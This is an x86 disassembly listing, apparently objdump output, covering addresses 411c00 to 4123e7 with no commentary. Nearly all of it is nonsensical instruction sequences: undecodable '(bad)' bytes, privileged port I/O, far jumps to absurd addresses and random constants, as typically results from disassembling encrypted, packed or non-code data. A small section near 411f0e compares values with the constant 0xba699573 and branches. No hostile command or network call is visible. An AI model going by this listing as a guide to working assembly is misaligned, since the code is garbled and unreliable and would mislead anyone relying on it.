  411c00:	xor    eax,0xabd4aa4d
  411c05:	jp     0x411c05
  411c07:	mov    eax,ds:0xd6b45469
  411c0c:	mov    ebx,0x231b6c0b
  411c11:	in     al,dx
  411c12:	repz cli 
  411c14:	push   0xffffffd3
  411c16:	jg     0x411c43
  411c18:	cmp    BYTE PTR cs:[esi],0x7c
  411c1c:	inc    ecx
  411c1d:	adc    al,0xca
  411c1f:	call   0xd4d8:0x7513c432
  411c26:	aam    0x12
  411c28:	dec    esi
  411c29:	rcr    BYTE PTR [ebx-0x7d],1
  411c2c:	sub    dh,BYTE PTR [ebp+0x404d22e3]
  411c32:	lea    edx,[edx]
  411c34:	in     al,dx
  411c35:	imul   eax,DWORD PTR [esi],0x1c59ec11
  411c3b:	scas   eax,DWORD PTR es:[edi]
  411c3c:	add    al,0xd
  411c3e:	imul   ecx,DWORD PTR [esi+0x2843f3a],0x11
  411c45:	xchg   esi,eax
  411c46:	ds jo  0x411c85
  411c49:	leave  
  411c4a:	retf   0xc25d
  411c4d:	test   al,0x1e
  411c4f:	xor    eax,0x68be35b6
  411c54:	or     al,0x4
  411c56:	jmp    0xb8141582
  411c5b:	or     DWORD PTR [edx-0x90759cf],ecx
  411c61:	add    eax,0xcec212b1
  411c66:	(bad)  
  411c67:	mov    cl,0x23
  411c69:	sbb    eax,0xc95bb38a
  411c6e:	repz jg 0x411c87
  411c71:	pop    esp
  411c72:	jmp    0x8374:0xb70ef93b
  411c79:	ja     0x411c37
  411c7b:	int3   
  411c7c:	sbb    ecx,0x21c0f23d
  411c82:	push   0xf316b78f
  411c87:	mov    al,ds:0x5efb310b
  411c8c:	jmp    0x411c65
  411c8e:	add    BYTE PTR [edi],ch
  411c90:	pop    es
  411c91:	sub    BYTE PTR [ecx-0x71cf3ce9],cl
  411c97:	xor    al,0xca
  411c99:	inc    ebp
  411c9a:	mov    eax,ds:0xab2474b5
  411c9f:	stos   DWORD PTR es:[edi],eax
  411ca0:	inc    edx
  411ca1:	jecxz  0x411c88
  411ca3:	dec    ebx
  411ca4:	cmp    BYTE PTR [eax+0x1f62b7c3],ah
  411caa:	mov    cl,0xcc
  411cac:	xchg   edi,eax
  411cad:	push   ds
  411cae:	call   0xcd5e:0x72bc273a
  411cb5:	mov    al,0x96
  411cb7:	in     al,dx
  411cb8:	fwait
  411cb9:	and    eax,0xe8dd8d5c
  411cbe:	jg     0x411c72
  411cc0:	and    eax,0x8c7e70b8
  411cc5:	cmc    
  411cc6:	sbb    eax,0x4e794af2
  411ccb:	mov    ch,0x42
  411ccd:	jg     0x411d2e
  411ccf:	addr16 mov dh,0x90
  411cd2:	pusha  
  411cd3:	xor    al,bh
  411cd5:	mov    gs,WORD PTR [edx-0x4]
  411cd8:	aad    0x2b
  411cda:	dec    edx
  411cdb:	ftst   
  411cdd:	into   
  411cde:	scas   eax,DWORD PTR es:[edi]
  411cdf:	push   ebx
  411ce0:	jb     0x411ca8
  411ce2:	xlat   BYTE PTR ds:[ebx]
  411ce3:	rcr    BYTE PTR [edi],0x9d
  411ce6:	sub    BYTE PTR [edx+ebp*8],al
  411ce9:	cdq    
  411cea:	dec    esp
  411ceb:	and    DWORD PTR [ebp+0x13fb4a91],ebp
  411cf1:	fiadd  DWORD PTR [edx]
  411cf3:	sbb    eax,0xcb936fea
  411cf8:	into   
  411cf9:	out    dx,al
  411cfa:	dec    ebx
  411cfb:	call   0x3555:0x73ca854d
  411d02:	pop    ss
  411d03:	fbld   TBYTE PTR [edi+0xc]
  411d06:	mov    ah,0xcc
  411d08:	clc    
  411d09:	repz lahf 
  411d0b:	jg     0x411d21
  411d0d:	pop    ebx
  411d0e:	push   edi
  411d0f:	rol    DWORD PTR [ebx],0x9b
  411d12:	dec    eax
  411d13:	push   ecx
  411d14:	out    0x24,al
  411d16:	adc    BYTE PTR [ebp-0x42],bh
  411d19:	xchg   DWORD PTR [ecx-0x1fb95eeb],edi
  411d1f:	inc    ecx
  411d20:	daa    
  411d21:	sub    eax,0x5e6263e1
  411d26:	push   ebx
  411d27:	lds    ebx,FWORD PTR [ebx+0x440bea40]
  411d2d:	cdq    
  411d2e:	enter  0x94b4,0xb7
  411d32:	mov    ecx,0xf3bf1cfb
  411d37:	mov    dh,0x8c
  411d39:	pop    esi
  411d3a:	fcmovbe st,st(4)
  411d3c:	imul   DWORD PTR es:[ebp-0x708e4b6]
  411d43:	nop
  411d44:	and    BYTE PTR [ebx],0xae
  411d47:	mov    WORD PTR [eax],es
  411d49:	push   0x6
  411d4b:	fwait
  411d4c:	xor    ebx,DWORD PTR [esi+0xd]
  411d4f:	dec    ebp
  411d50:	(bad)  
  411d51:	xcrypt-cbc (bad)
  411d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d53:	adc    esp,DWORD PTR [edi]
  411d55:	aaa    
  411d56:	mov    ds:0xee9c3b48,eax
  411d5b:	(bad)
  411d60:	pop    esp
  411d61:	in     al,dx
  411d62:	pop    esp
  411d63:	sbb    BYTE PTR [eax+0x26],al
  411d66:	rcr    DWORD PTR [esi-0x5febb2b2],cl
  411d6c:	xor    DWORD PTR [edx+0x2b507ca2],esp
  411d72:	imul   esp,edx,0xffffffe0
  411d75:	xchg   ebp,eax
  411d76:	ss dec edi
  411d78:	test   DWORD PTR [eax],esi
  411d7a:	jne    0x411d5a
  411d7c:	cmp    DWORD PTR [edi],ebp
  411d7e:	jne    0x411db2
  411d80:	cmp    eax,0x327a77b4
  411d85:	or     al,0x59
  411d87:	fisttp QWORD PTR [esi+0x21]
  411d8a:	aad    0x45
  411d8c:	mov    ebx,0x96c6365c
  411d91:	retf   0x7d5a
  411d94:	outs   dx,DWORD PTR ds:[esi]
  411d95:	inc    esp
  411d96:	and    BYTE PTR [edi+edx*8],ah
  411d99:	pop    ebp
  411d9a:	mov    bl,0x29
  411d9c:	add    esi,ecx
  411d9e:	loop   0x411d85
  411da0:	popa   
  411da1:	(bad)  
  411da3:	(bad)  
  411da4:	fistp  WORD PTR [esi]
  411da6:	ds xlat BYTE PTR es:[ebx]
  411da9:	mov    edi,0xcff76a10
  411dae:	xchg   BYTE PTR [ecx+0x23],cl
  411db1:	push   0xffffffa5
  411db3:	sbb    esp,esp
  411db5:	adc    ch,BYTE PTR ds:0x97dcefde
  411dbb:	mov    edx,0x33ac9173
  411dc0:	aam    0xa9
  411dc2:	test   DWORD PTR [ebx-0x51],0x3cd2ed3d
  411dc9:	dec    ecx
  411dca:	jbe    0x411e0e
  411dcc:	dec    ecx
  411dcd:	jecxz  0x411e3e
  411dcf:	cli    
  411dd0:	fs out 0x9b,al
  411dd3:	lock ficomp DWORD PTR ds:0x5ffec537
  411dda:	ret    0x6668
  411ddd:	cmp    BYTE PTR [esi+0x7da9e7a9],ch
  411de3:	add    ah,bh
  411de5:	push   ecx
  411de6:	cmp    DWORD PTR [eax+0x9],esi
  411de9:	mov    cl,0xce
  411deb:	neg    DWORD PTR [esi+0x8]
  411dee:	dec    ecx
  411def:	mov    bl,0x6f
  411df1:	push   edx
  411df2:	or     eax,0x6b08455a
  411df7:	xchg   BYTE PTR [eax+ebx*2+0x17918760],ah
  411dfe:	cmp    ch,dl
  411e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e01:	pop    edi
  411e02:	mov    ebx,edi
  411e04:	fmul   QWORD PTR [ebp+0x6a]
  411e07:	and    DWORD PTR [esi],ebx
  411e09:	pop    esi
  411e0a:	outs   dx,BYTE PTR ds:[esi]
  411e0b:	push   ds
  411e0c:	mov    ch,dh
  411e0e:	mov    edi,0x8ec00efd
  411e13:	enter  0x6d9d,0x93
  411e17:	ss adc al,0xf4
  411e1a:	push   esp
  411e1b:	jmp    0x411e0d
  411e1d:	arpl   WORD PTR [edx],sp
  411e1f:	shl    ecx,0x17
  411e22:	xor    eax,0xbb7a804f
  411e27:	hlt    
  411e28:	aaa    
  411e29:	xchg   esp,eax
  411e2a:	ror    esp,cl
  411e2c:	sub    DWORD PTR [ebx-0x3d],esi
  411e2f:	nop
  411e30:	js     0x411e27
  411e32:	cmp    al,0x49
  411e34:	mov    ebx,DWORD PTR [edi]
  411e36:	dec    esp
  411e37:	push   ds
  411e38:	enter  0x2d31,0xeb
  411e3c:	mov    eax,edi
  411e3e:	cmp    ch,dh
  411e40:	pop    es
  411e41:	sar    DWORD PTR [esi+0x74a0e075],0xe
  411e48:	pusha  
  411e49:	pop    ebp
  411e4a:	out    0x2b,al
  411e4c:	sbb    eax,ebp
  411e4e:	pop    ecx
  411e4f:	sbb    dh,BYTE PTR [esi+0x17e7e4ef]
  411e55:	push   cs
  411e56:	js     0x411ec3
  411e58:	pusha  
  411e59:	dec    edi
  411e5a:	sti    
  411e5b:	lock cmc 
  411e5d:	jae    0x411eb8
  411e5f:	ret    0x9c7b
  411e62:	jp     0x411eb6
  411e64:	jo     0x411e18
  411e66:	jecxz  0x411e59
  411e68:	inc    ecx
  411e69:	ins    DWORD PTR es:[edi],dx
  411e6a:	push   es
  411e6b:	and    ebp,ecx
  411e6d:	mov    dl,0xcd
  411e6f:	loop   0x411e55
  411e71:	mov    edi,?
  411e73:	and    DWORD PTR [edi-0x9e6d4ad],ebp
  411e79:	outs   dx,BYTE PTR ds:[esi]
  411e7a:	cmp    eax,0xf34d10ec
  411e7f:	push   0x70ff52ef
  411e84:	or     eax,0xd0b82d89
  411e89:	call   0x26f6:0x510f4d05
  411e90:	jmp    0x5d07:0xf183ba4e
  411e97:	arpl   WORD PTR [ecx-0x682e89ec],sp
  411e9d:	stc    
  411e9e:	dec    ebx
  411e9f:	loope  0x411ee3
  411ea1:	jb     0x411e30
  411ea3:	add    DWORD PTR [edi+0x62],0x176f3395
  411eaa:	sbb    BYTE PTR [ebp+0x60e3c76],ch
  411eb0:	xchg   esi,eax
  411eb1:	fcom   QWORD PTR [ebx+0x54]
  411eb4:	outs   dx,DWORD PTR ds:[esi]
  411eb5:	hlt    
  411eb6:	cdq    
  411eb7:	mov    ch,0xba
  411eb9:	inc    ebp
  411eba:	mov    eax,0x7d82401d
  411ebf:	or     edx,DWORD PTR [ebp+0x3a]
  411ec2:	dec    esi
  411ec3:	inc    esp
  411ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ec5:	mov    DWORD PTR [edi+0x64],edx
  411ec8:	mov    DWORD PTR [edx+eiz*2],edx
  411ecb:	popf   
  411ecc:	das    
  411ecd:	into   
  411ece:	mov    cl,0x52
  411ed0:	jae    0x411f33
  411ed2:	shl    eax,1
  411ed4:	test   eax,0xe5221dd7
  411ed9:	fsub   DWORD PTR [ecx+0x3b]
  411edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411edd:	imul   edi,DWORD PTR [esi+0x3ae71408],0x36
  411ee4:	push   edx
  411ee5:	xchg   esi,eax
  411ee6:	dec    esp
  411ee7:	(bad)  
  411ee8:	and    BYTE PTR [ebp-0x440ee5e4],al
  411eee:	mov    BYTE PTR [edx],cl
  411ef0:	sar    DWORD PTR [ebp+0x4c136de3],1
  411ef6:	shr    DWORD PTR [eax-0x1084b037],1
  411efc:	fwait
  411efd:	pop    edx
  411efe:	stos   DWORD PTR es:[edi],eax
  411eff:	xor    edi,DWORD PTR [ebp+0x3bc8c8d6]
  411f05:	push   es
  411f06:	jmp    0x9606c118
  411f0b:	sub    DWORD PTR [ecx+eax*8],ebx
  411f0e:	loopne 0x411f12
  411f10:	mov    DWORD PTR [ebp+0x10],edx
  411f13:	mov    edx,DWORD PTR [ebp-0x54]
  411f16:	xor    eax,0xba699573
  411f1b:	mov    DWORD PTR [ebp+0x14],edx
  411f1e:	cmp    eax,DWORD PTR [ebp+0x10]
  411f21:	jne    0x416379
  411f27:	mov    eax,edx
  411f29:	cmp    DWORD PTR [ebp+0xc],eax
  411f2c:	jne    0x416379
  411f32:	mov    DWORD PTR [ebp+0x8],0xba699573
  411f39:	jmp    0x4124c3
  411f3e:	(bad)  
  411f3f:	repz mov al,ds:0x46199861
  411f45:	sbb    dh,cl
  411f47:	jmp    0x8037cdc2
  411f4c:	cmp    BYTE PTR [eax+0x25],ch
  411f4f:	xor    BYTE PTR [esi],dl
  411f51:	push   ss
  411f52:	cmp    eax,0x52161604
  411f57:	mov    dl,0x61
  411f59:	push   ds
  411f5a:	inc    edi
  411f5b:	jnp    0x411f5d
  411f5d:	test   eax,0xa7df0b1a
  411f62:	ja     0x411f89
  411f64:	fld    TBYTE PTR [edi+0x336e7617]
  411f6a:	fbstp  TBYTE PTR [edi-0x49]
  411f6d:	cs mov edx,0xf8e2c32b
  411f73:	mov    es,WORD PTR [edx]
  411f75:	(bad)  
  411f76:	repz cmp al,0xb9
  411f79:	int    0xe7
  411f7b:	outs   dx,BYTE PTR ds:[esi]
  411f7d:	dec    edx
  411f7e:	(bad)  
  411f7f:	xor    eax,0x9277a24c
  411f84:	or     ch,al
  411f86:	sub    BYTE PTR [edi-0x387cb5d5],cl
  411f8c:	pop    edi
  411f8d:	jge    0x411f3d
  411f8f:	adc    eax,0xc11c3f30
  411f94:	or     al,0xe3
  411f96:	out    dx,al
  411f97:	clc    
  411f98:	int3   
  411f99:	pusha  
  411f9a:	test   edx,esi
  411f9c:	mov    ebp,0x81aed7df
  411fa1:	inc    esp
  411fa2:	fst    DWORD PTR [esi]
  411fa4:	sbb    edx,DWORD PTR [esi+0x4d]
  411fa7:	jmp    0x620d:0xf4684916
  411fae:	and    eax,0xc65ee77d
  411fb3:	add    al,BYTE PTR ds:0xf53cec7f
  411fb9:	cld    
  411fba:	popa   
  411fbb:	xor    al,0x54
  411fbd:	sbb    esi,DWORD PTR [eax-0x5837aa8f]
  411fc3:	jne    0x411f9a
  411fc5:	das    
  411fc6:	imul   ecx,DWORD PTR [ebp+0x1067df75],0x7a
  411fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fce:	mov    esi,edi
  411fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd1:	dec    edx
  411fd2:	dec    edi
  411fd3:	out    0x45,al
  411fd5:	push   edi
  411fd6:	xor    ebp,DWORD PTR [ebp+edx*4-0x63b3fe60]
  411fdd:	(bad)  
  411fde:	xchg   ebx,eax
  411fdf:	jmp    DWORD PTR [ebx-0x14]
  411fe2:	sub    al,0x65
  411fe4:	test   al,0xe2
  411fe6:	int    0xf9
  411fe8:	xchg   ebx,eax
  411fe9:	lock hlt 
  411feb:	and    dl,BYTE PTR [edi-0x6a]
  411fee:	retf   
  411fef:	int3   
  411ff0:	leave  
  411ff1:	and    DWORD PTR [eax],ebx
  411ff3:	xlat   BYTE PTR ds:[ebx]
  411ff4:	sbb    BYTE PTR [ebx],ah
  411ff6:	dec    ecx
  411ff7:	sbb    dl,BYTE PTR ds:0x441228e4
  411ffd:	xchg   esp,eax
  411ffe:	int    0xf6
  412000:	popf   
  412001:	not    DWORD PTR [edi-0x50]
  412004:	push   esp
  412005:	fdiv   DWORD PTR [edx+eax*2+0x4b]
  412009:	jecxz  0x412041
  41200b:	xor    BYTE PTR [eax-0x129f1455],ah
  412011:	in     eax,0xb7
  412013:	cmp    ecx,DWORD PTR [ebp+0x3c8cfd5a]
  412019:	mov    ebp,0xdb68922
  41201e:	mov    ebp,0x8cbed60e
  412023:	cli    
  412024:	fild   WORD PTR [edx+0x27]
  412027:	loope  0x412051
  412029:	cmc    
  41202a:	rol    BYTE PTR [edi+ecx*1-0x3a],1
  41202e:	aam    0x2
  412030:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412032:	lds    ecx,FWORD PTR [edi]
  412034:	out    0x46,al
  412036:	cmp    DWORD PTR [eax],eax
  412038:	xor    al,0x60
  41203a:	sar    BYTE PTR [esi+eiz*2+0x6b],1
  41203e:	mov    ecx,0x8a323780
  412043:	ja     0x412010
  412045:	push   0x61
  412047:	mov    bh,bh
  412049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41204a:	add    al,0x5d
  41204c:	outs   dx,BYTE PTR ds:[esi]
  41204d:	aaa    
  41204e:	xchg   edi,eax
  41204f:	inc    eax
  412050:	cmc    
  412051:	cmc    
  412052:	pop    edx
  412053:	add    DWORD PTR [eax+0x1],ebp
  412056:	and    edx,ebx
  412058:	mov    ebx,0x30ab93ea
  41205d:	add    al,BYTE PTR [edx+esi*8-0x25]
  412061:	stc    
  412062:	pop    ebp
  412063:	mov    al,ds:0xd8822bc
  412068:	(bad)  
  412069:	jmp    0xfcf5:0x1a2963a1
  412070:	je     0x4120cd
  412072:	call   FWORD PTR [esi]
  412074:	lods   eax,DWORD PTR ds:[esi]
  412075:	push   ebx
  412076:	scas   eax,DWORD PTR es:[edi]
  412077:	push   es
  412078:	in     al,0xa1
  41207a:	jb     0x41202d
  41207c:	push   ecx
  41207d:	mov    al,ds:0xc9b70eaf
  412082:	dec    ebx
  412083:	mov    cl,BYTE PTR [esi]
  412085:	aaa    
  412086:	enter  0x8991,0x7a
  41208a:	xchg   edi,eax
  41208b:	jno    0x4120a3
  41208d:	adc    DWORD PTR ds:0x293dcff1,ecx
  412093:	adc    edx,edi
  412095:	mov    edi,DWORD PTR [esi]
  412097:	xchg   esp,eax
  412098:	add    BYTE PTR [edx-0x17],bh
  41209b:	dec    edx
  41209c:	push   ebp
  41209d:	int3   
  41209e:	lods   al,BYTE PTR ds:[esi]
  41209f:	pop    esp
  4120a0:	xor    BYTE PTR [eax-0x27ad6ed7],ah
  4120a6:	aaa    
  4120a7:	outs   dx,DWORD PTR ds:[esi]
  4120a8:	sbb    eax,0x38ab46ec
  4120ad:	push   edx
  4120ae:	in     eax,0x9f
  4120b0:	or     edx,DWORD PTR [edx]
  4120b2:	xchg   edx,eax
  4120b3:	aaa    
  4120b4:	or     al,0x91
  4120b6:	out    dx,eax
  4120b7:	sub    DWORD PTR [esi+0x7dd7c20e],eax
  4120bd:	retf   0x3cfa
  4120c0:	dec    edi
  4120c1:	and    ebx,DWORD PTR [edi-0x7e]
  4120c4:	mov    gs,WORD PTR [ebx+0x763cd095]
  4120ca:	mov    esi,0x2a458772
  4120cf:	push   ds
  4120d0:	test   ch,ch
  4120d2:	or     dl,BYTE PTR [ecx]
  4120d4:	int3   
  4120d5:	add    dl,BYTE PTR [ebx-0x1ee21814]
  4120db:	pusha  
  4120dc:	in     al,dx
  4120dd:	xlat   BYTE PTR ds:[ebx]
  4120de:	sbb    eax,0x54a3d5b5
  4120e3:	or     eax,0x46bcf072
  4120e8:	pop    esi
  4120e9:	in     al,dx
  4120ea:	loope  0x41208d
  4120ec:	pop    ebp
  4120ed:	sub    eax,0xa9678330
  4120f2:	mov    WORD PTR [eax],es
  4120f4:	jb     0x41211d
  4120f6:	jno    0x41210d
  4120f8:	fwait
  4120f9:	sbb    eax,0x825d9079
  4120fe:	mov    edx,ebp
  412100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412101:	int    0x21
  412103:	or     BYTE PTR [edx],0x2c
  412106:	loope  0x4120ea
  412108:	pop    DWORD PTR [edx]
  41210a:	imul   ecx,DWORD PTR [eax-0x35],0x952ad4cd
  412111:	jle    0x41212f
  412113:	xchg   ebp,eax
  412114:	xor    bh,BYTE PTR [ebp+0x60e0a72a]
  41211a:	adc    eax,DWORD PTR [ebx+0x76]
  41211d:	dec    edi
  41211e:	sar    DWORD PTR [eax-0x70],0x63
  412122:	ror    BYTE PTR [ebp+ebp*8+0x64],0xf4
  412127:	sub    al,0x66
  412129:	test   eax,0x8bec06a7
  41212e:	add    cl,0xa
  412131:	retf   
  412132:	addr16 repnz pushf 
  412135:	mov    ds:0x5a7f7016,al
  41213a:	xchg   edi,eax
  41213b:	mov    dl,0x60
  41213d:	add    DWORD PTR [eax+0x16],esp
  412140:	popa   
  412141:	popa   
  412142:	stos   BYTE PTR es:[edi],al
  412143:	ret    0x268c
  412146:	adc    al,0x9b
  412148:	pop    ds
  412149:	xor    al,0x9d
  41214b:	data16 in al,0xcc
  41214e:	fist   WORD PTR [ebx+0x69]
  412151:	mov    DWORD PTR [ebx-0x44],0x2619ce78
  412158:	adc    al,0xb6
  41215a:	or     dl,BYTE PTR [ebx+ebx*2-0x29]
  41215e:	outs   dx,DWORD PTR ds:[esi]
  41215f:	shr    BYTE PTR [ebp+0x5b146ece],1
  412165:	arpl   sp,cx
  412167:	xor    ebp,0xe9bb7396
  41216d:	test   BYTE PTR [ecx+esi*8],ah
  412170:	sbb    edi,DWORD PTR ds:0x56720160
  412176:	sbb    DWORD PTR [eax-0x34],ecx
  412179:	pushf  
  41217a:	and    dl,BYTE PTR [edx+ecx*1+0x13]
  41217e:	rcr    DWORD PTR [edx+0x5d],1
  412181:	test   BYTE PTR [esi+ebp*4-0x5bef1d5a],0x75
  412189:	ss dec edi
  41218b:	aas    
  41218c:	test   BYTE PTR [esi+esi*8+0x63],al
  412190:	loop   0x412170
  412192:	add    ecx,ebx
  412194:	fistp  QWORD PTR [edx+0x32a1c245]
  41219a:	ja     0x4121d6
  41219c:	adc    eax,0x272af9bb
  4121a1:	dec    ecx
  4121a2:	pop    ebx
  4121a3:	or     eax,0x4f0888f9
  4121a8:	xor    ecx,DWORD PTR [ebp+0x3bfada21]
  4121ae:	jp     0x41214f
  4121b0:	push   edx
  4121b1:	or     esp,ebp
  4121b3:	imul   edx,DWORD PTR [ebx+0x151ffa4],0x2ea55d8c
  4121bd:	sti    
  4121be:	daa    
  4121bf:	aad    0xdf
  4121c1:	mov    dh,0x6b
  4121c3:	mov    eax,0x266f2fc0
  4121c8:	adc    dl,BYTE PTR ds:0xfa63a91c
  4121ce:	daa    
  4121cf:	or     BYTE PTR [edx],dl
  4121d1:	lock clc 
  4121d3:	jns    0x412177
  4121d5:	rcr    DWORD PTR [ebp+0x1b],0xce
  4121d9:	sbb    al,0xf7
  4121db:	add    eax,0x99c613d1
  4121e0:	mov    dl,0x45
  4121e2:	sub    BYTE PTR [ebx],bh
  4121e4:	aaa    
  4121e5:	scas   eax,DWORD PTR es:[edi]
  4121e6:	mov    ebx,0xb2d3a214
  4121eb:	pop    ss
  4121ec:	push   ebx
  4121ed:	mov    al,BYTE PTR [edi+0x17]
  4121f0:	xlat   BYTE PTR ds:[ebx]
  4121f1:	into   
  4121f2:	not    BYTE PTR [eax+0x7d]
  4121f5:	inc    eax
  4121f6:	push   0xa7c46745
  4121fb:	fwait
  4121fc:	pop    ss
  4121fd:	mov    dl,0xe8
  4121ff:	jmp    0x3ff0:0xb8a8dea3
  412206:	aam    0xb3
  412208:	(bad)  
  412209:	mov    dl,0xe1
  41220b:	xchg   ebx,eax
  41220c:	and    eax,0xd8a9f727
  412211:	push   es
  412212:	jae    0x4121f3
  412214:	mov    edi,0x564626c9
  412219:	lahf   
  41221a:	cmp    ah,BYTE PTR [ebx-0x76]
  41221d:	mov    bl,0x49
  41221f:	pop    DWORD PTR es:[esi]
  412222:	(bad)  
  412223:	cmp    eax,ebx
  412225:	xor    eax,0xde16989a
  41222a:	mov    edi,0x3e9c14cd
  41222f:	mov    dh,0x7a
  412231:	sbb    eax,0x9cc757bd
  412236:	or     eax,0xf9ed5a58
  41223b:	jle    0x41229d
  41223d:	fs inc ecx
  41223f:	iret   
  412240:	iret   
  412241:	inc    esi
  412242:	cmp    ah,cl
  412244:	pop    es
  412245:	fstp   DWORD PTR [edi]
  412247:	cld    
  412248:	inc    esi
  412249:	mov    ebp,0x63f97ed4
  41224e:	jg     0x412245
  412250:	lahf   
  412251:	push   ss
  412252:	addr16 push esp
  412254:	dec    edi
  412255:	cli    
  412256:	cs int 0xd3
  412259:	push   cs
  41225a:	sbb    edi,ebp
  41225c:	add    DWORD PTR [esi+0x62],eax
  41225f:	repz int3 
  412261:	aaa    
  412262:	aaa    
  412263:	xor    ecx,ebx
  412265:	int    0x60
  412267:	into   
  412268:	and    edi,DWORD PTR [ecx]
  41226a:	ja     0x41222f
  41226c:	pop    es
  41226d:	loop   0x4122a1
  41226f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412270:	fst    st(7)
  412272:	mov    cl,0x65
  412274:	pop    edi
  412275:	dec    ebp
  412276:	sbb    bh,al
  412278:	xchg   esp,eax
  412279:	add    al,0x9c
  41227b:	pushf  
  41227c:	out    0x50,al
  41227e:	xor    eax,0xe77dad9f
  412283:	pop    ds
  412284:	pushf  
  412285:	(bad)
  412288:	inc    edi
  412289:	pop    ds
  41228a:	jnp    0x412260
  41228c:	aam    0xa7
  41228e:	out    dx,al
  41228f:	add    eax,0xe4ac4662
  412294:	or     bh,ah
  412296:	int    0x70
  412298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412299:	cvttps2pi mm4,QWORD PTR [ecx+ecx*8-0x30b79f27]
  4122a1:	fisttp DWORD PTR [esi-0x7d]
  4122a4:	inc    ecx
  4122a5:	and    bl,BYTE PTR [ebp-0x50]
  4122a8:	test   esp,0x85bad6a
  4122ae:	jnp    0x4122a8
  4122b0:	pop    ebx
  4122b1:	or     BYTE PTR [edx],bl
  4122b3:	aaa    
  4122b4:	and    al,0x78
  4122b6:	sub    al,0x21
  4122b8:	mov    ecx,0xd7f1477e
  4122bd:	test   al,0xef
  4122bf:	add    ah,BYTE PTR [eax-0x2f]
  4122c2:	lgs    eax,FWORD PTR [eax-0x51]
  4122c6:	or     cl,BYTE PTR [edi]
  4122c8:	mov    BYTE PTR [ecx-0x198439af],al
  4122ce:	outs   dx,DWORD PTR ds:[esi]
  4122cf:	mov    esp,DWORD PTR [edi-0x3a85042b]
  4122d5:	adc    ecx,DWORD PTR [ebx-0x743d77a2]
  4122db:	jmp    0xbec4:0xeed87c2e
  4122e2:	je     0x4122ae
  4122e4:	in     al,dx
  4122e5:	and    eax,0x33afaec3
  4122ea:	jmp    0x4122ff
  4122ec:	jl     0x41235d
  4122ee:	js     0x4122be
  4122f0:	test   bh,dh
  4122f2:	mul    ebx
  4122f4:	push   esp
  4122f5:	test   eax,0xc5a23fe4
  4122fa:	sahf   
  4122fb:	daa    
  4122fc:	and    edx,DWORD PTR [eax+0x70]
  4122ff:	(bad)  
  412301:	mov    cl,0x23
  412303:	add    DWORD PTR [esi],ecx
  412305:	call   0xb8ab:0xc7063b57
  41230c:	sbb    al,0x16
  41230e:	ror    BYTE PTR [ecx+0x62ab2b0b],1
  412314:	stos   DWORD PTR es:[edi],eax
  412315:	aam    0xf
  412317:	(bad)  [ebx-0x1db02c69]
  41231d:	sbb    BYTE PTR [esi-0x18ee85bc],al
  412323:	jg     0x412332
  412325:	pop    ecx
  412326:	cmp    ah,bh
  412328:	add    dl,BYTE PTR [ebx]
  41232a:	dec    edx
  41232b:	xor    ax,0xd1b3
  41232f:	aas    
  412330:	adc    ecx,DWORD PTR [ebp+edi*4-0x427c9f76]
  412337:	aad    0x19
  412339:	dec    ebx
  41233a:	loopne 0x4122bc
  41233c:	inc    edx
  41233d:	cdq    
  41233e:	jae    0x412317
  412340:	fist   DWORD PTR [eax-0xc]
  412343:	ror    DWORD PTR fs:[ebp+esi*2-0x69278d19],1
  41234b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234c:	repz sbb DWORD PTR [ecx+0x5c],edi
  412350:	jbe    0x4122e0
  412352:	outs   dx,DWORD PTR ds:[esi]
  412353:	xor    BYTE PTR [ebx+0x18],ah
  412356:	int3   
  412357:	lods   al,BYTE PTR ds:[esi]
  412358:	adc    al,0x37
  41235a:	(bad)  
  41235b:	adc    DWORD PTR [ecx],edi
  41235d:	xchg   ebx,eax
  41235e:	sti    
  41235f:	mov    eax,esi
  412361:	mov    esp,0x8d63f54f
  412366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412367:	rol    BYTE PTR [ebx+0x63],cl
  41236a:	mov    edi,edi
  41236c:	xor    ecx,DWORD PTR [edi+0xdb83d3b]
  412372:	inc    edi
  412373:	div    BYTE PTR [eax]
  412375:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412377:	jge    0x4123ba
  412379:	call   0xa65d:0xca8d0bfa
  412380:	jne    0x41239f
  412382:	sar    DWORD PTR [ecx-0x33f00f1f],cl
  412388:	cmc    
  412389:	xchg   esp,eax
  41238a:	rcl    DWORD PTR [esi],cl
  41238c:	sub    DWORD PTR [ebx],edx
  41238e:	loop   0x41233d
  412390:	or     al,0x38
  412392:	jne    0x412355
  412394:	lods   eax,DWORD PTR ds:[esi]
  412395:	jl     0x4123ac
  412397:	dec    edx
  412398:	push   cs
  412399:	imul   esp,DWORD PTR [ecx+0x169dcfd3],0x30
  4123a0:	(bad)  [eax-0x491596be]
  4123a6:	nop
  4123a7:	aaa    
  4123a8:	out    0xf0,eax
  4123aa:	and    ch,BYTE PTR [ebx+ebp*2]
  4123ad:	(bad)  
  4123ae:	sti    
  4123af:	sub    eax,0xffffff87
  4123b2:	scas   al,BYTE PTR es:[edi]
  4123b3:	mov    al,ds:0xe08fc009
  4123b8:	sub    BYTE PTR [esi+edx*1-0x3],dh
  4123bc:	test   al,0xcc
  4123be:	jbe    0x4123f3
  4123c0:	adc    bl,dh
  4123c2:	dec    esi
  4123c3:	push   ecx
  4123c4:	sbb    al,0xb5
  4123c6:	mov    al,0x66
  4123c8:	sahf   
  4123c9:	jae    0x4123a5
  4123cb:	retf   0x77d3
  4123ce:	push   ds
  4123cf:	(bad)  
  4123d0:	pushf  
  4123d1:	fst    DWORD PTR [esi]
  4123d3:	mov    cs,WORD PTR [eax]
  4123d5:	jns    0x41241a
  4123d7:	sbb    esp,DWORD PTR [eax+0x56cc5c31]
  4123dd:	and    al,0x1f
  4123df:	or     dl,BYTE PTR [ebp+edi*4+0x53]
  4123e3:	jg     0x41242a
  4123e5:	jp     0x41243e
  4123e7:	xchg   edx,eax
